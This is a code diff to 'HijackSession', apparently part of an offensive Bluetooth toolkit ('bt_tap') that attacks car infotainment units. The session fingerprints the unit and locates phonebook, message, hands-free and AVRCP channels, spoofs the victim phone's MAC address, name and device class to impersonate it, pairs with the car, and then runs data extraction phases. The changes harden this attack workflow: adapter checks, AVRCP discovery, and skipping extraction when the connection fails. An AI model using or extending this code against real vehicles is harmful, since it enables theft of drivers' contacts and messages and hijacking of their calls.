@@ -67,14 +67,23 @@ class HijackSession:
         self.pbap_channel = None
         self.map_channel = None
         self.hfp_channel = None
+        self.avrcp_channel = None
 
         # Active connections
         self.pbap_client = None
         self.map_client = None
         self.hfp_client = None
 
+    def _check_adapter(self) -> bool:
+        """Verify adapter is ready before any phase."""
+        from bt_tap.utils.bt_helpers import ensure_adapter_ready
+        return ensure_adapter_ready(self.hci)
+
     def recon(self) -> dict:
         """Phase 1: Reconnaissance - fingerprint IVI and find service channels."""
+        if not self._check_adapter():
+            return {"error": "adapter not ready"}
+
         with phase("Reconnaissance", 1, 5):
             # Resolve phone name if not provided
             if not self.phone_name:
@@ -84,24 +93,29 @@ class HijackSession:
 
             # Fingerprint the IVI
             with step("Fingerprinting IVI"):
-                self.ivi_fingerprint = fingerprint_device(self.ivi_address)
+                self.ivi_fingerprint = fingerprint_device(self.ivi_address, self.hci)
 
             # Find specific service channels
             with step("Browsing SDP services"):
                 self.ivi_services = browse_services(self.ivi_address)
 
             with step("Locating target service channels"):
-                self.pbap_channel = find_service_channel(self.ivi_address, "Phonebook")
+                # Pass pre-fetched services to avoid redundant SDP browses
+                self.pbap_channel = find_service_channel(self.ivi_address, "Phonebook", self.ivi_services)
                 if not self.pbap_channel:
-                    self.pbap_channel = find_service_channel(self.ivi_address, "PBAP")
+                    self.pbap_channel = find_service_channel(self.ivi_address, "PBAP", self.ivi_services)
 
-                self.map_channel = find_service_channel(self.ivi_address, "Message")
+                self.map_channel = find_service_channel(self.ivi_address, "Message", self.ivi_services)
                 if not self.map_channel:
-                    self.map_channel = find_service_channel(self.ivi_address, "MAP")
+                    self.map_channel = find_service_channel(self.ivi_address, "MAP", self.ivi_services)
 
-                self.hfp_channel = find_service_channel(self.ivi_address, "Hands-Free")
+                self.hfp_channel = find_service_channel(self.ivi_address, "Hands-Free", self.ivi_services)
                 if not self.hfp_channel:
-                    self.hfp_channel = find_service_channel(self.ivi_address, "HFP")
+                    self.hfp_channel = find_service_channel(self.ivi_address, "HFP", self.ivi_services)
+
+                self.avrcp_channel = find_service_channel(self.ivi_address, "AVRCP", self.ivi_services)
+                if not self.avrcp_channel:
+                    self.avrcp_channel = find_service_channel(self.ivi_address, "A/V Remote", self.ivi_services)
 
             # Summary
             summary_panel("Recon Results", {
@@ -110,6 +124,7 @@ class HijackSession:
                 "PBAP Channel": str(self.pbap_channel or "NOT FOUND"),
                 "MAP Channel": str(self.map_channel or "NOT FOUND"),
                 "HFP Channel": str(self.hfp_channel or "NOT FOUND"),
+                "AVRCP Channel": str(self.avrcp_channel or "NOT FOUND"),
             })
 
             if self.ivi_fingerprint.get("attack_surface"):
@@ -125,6 +140,9 @@ class HijackSession:
 
     def impersonate(self, method: str = "auto") -> bool:
         """Phase 2: Impersonate the phone (spoof MAC + name + class)."""
+        if not self._check_adapter():
+            return False
+
         with phase("Impersonation", 2, 5):
             device_class = "0x5a020c"
             with step(f"Cloning identity → {target(self.phone_address)}"):
@@ -145,6 +163,9 @@ class HijackSession:
         Uses bluetoothctl to pair, trust, then connect (per proven workflow).
         bluetoothctl is interactive, so we pipe commands via stdin.
         """
+        if not self._check_adapter():
+            return False
+
         with phase("Connect to IVI", 3, 5):
             from bt_tap.utils.bt_helpers import run_cmd
 
@@ -298,14 +319,25 @@ class HijackSession:
             results["phases"]["impersonate"] = {"status": "failed", "error": str(e)}
 
         # Phase 3: Connect
+        connected = False
         try:
             if self.connect_ivi():
                 results["phases"]["connect"] = {"status": "success"}
+                connected = True
             else:
-                results["phases"]["connect"] = {"status": "partial"}
+                results["phases"]["connect"] = {"status": "failed"}
+                warning("Connection failed — skipping data extraction phases")
         except Exception as e:
             error(f"Connection failed: {e}")
             results["phases"]["connect"] = {"status": "failed", "error": str(e)}
+
+        if not connected:
+            console.rule("[bold]Attack Summary")
+            for phase_name, result in results["phases"].items():
+                status = result["status"]
+                icon = {"success": "[green]✔[/green]", "failed": "[red]✖[/red]"}.get(status, "[dim]?[/dim]")
+                console.print(f"  {icon} {phase_name}: {status}")
+            return results
 
         # Phase 4a: PBAP
         try:
